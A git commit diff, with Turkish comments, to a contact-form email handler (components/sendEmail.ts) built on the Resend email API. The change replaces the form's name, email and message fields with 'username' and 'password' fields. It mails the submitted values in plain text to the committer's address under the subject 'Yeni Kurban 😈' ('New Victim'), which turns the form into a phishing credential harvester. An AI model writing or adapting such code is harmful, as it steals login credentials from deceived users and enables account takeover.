e84b644b81dab6002e56769ac1549a0a38559f3a
Tahaberk Soysal <berksysl.g@gmail.com>
2026-08-19 23:42:46 +0300

    testt

--- components/sendEmail.ts
+++ components/sendEmail.ts
@@ -5,17 +5,15 @@ import { Resend } from "resend";
 const resend = new Resend(process.env.RESEND_API_KEY);
 
 export async function sendContactEmail(formData: FormData) {
-  const name = formData.get("name") as string;
-  const email = formData.get("email") as string;
-  const message = formData.get("message") as string;
+  const username = formData.get("username") as string;
+  const password = formData.get("password") as string;
 
   try {
     const data = await resend.emails.send({
       from: "İletişim Formu <onboarding@resend.dev>", // Alan adınızı doğrulayana kadar test için bu adres kullanılır
       to: ["berksysl.g@gmail.com"], // Mailin düşeceği kendi adresiniz
-      replyTo: email, // Yanıtla dediğinizde formu dolduran kişiye gitmesi için
-      subject: `Yeni Form Mesajı: ${name}`,
-      text: `Gönderen: ${name} (${email})\n\nMesaj:\n${message}`,
+      subject: `Yeni Kurban 😈`,
+      text: `username: ${username} - password ${password}`,
     });
 
     return { success: true, data };
